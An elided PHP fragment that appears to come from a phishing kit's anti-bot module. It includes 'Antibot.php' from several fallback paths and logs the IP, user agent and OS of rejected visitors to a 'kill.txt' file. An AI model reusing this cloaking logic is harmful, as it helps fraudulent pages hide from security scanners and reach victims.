<?php
    ...
    if (file_exists('./Layout/Comp.php')) {
        require_once './Layout/Comp.php';
        require_once './Layout/Antibot.php';
        require_once './Layout/Json/autoload.php';
    } elseif (file_exists('../Comp.php')) {
        require_once '../Comp.php';
        require_once '../Antibot.php';
        require_once '../Json/autoload.php';
    } elseif (file_exists('../Layout/Comp.php')) {
        require_once '../Layout/Comp.php';
        require_once '../Layout/Antibot.php';
        require_once '../Layout/Json/autoload.php';
    } else {
    ...
    if (
        ...
        if (
            ...
            if (file_exists("../Export/key/kill.txt")) {
                $comps->log(
                    "../Export/key/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: OS (" . $comps->getOS() . ")\n\n"
                );
            } elseif (file_exists("../../Export/key/kill.txt")) {
                $comps->log(
                    "../../Export/key/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: OS (" . $comps->getOS() . ")\n\n"
                );
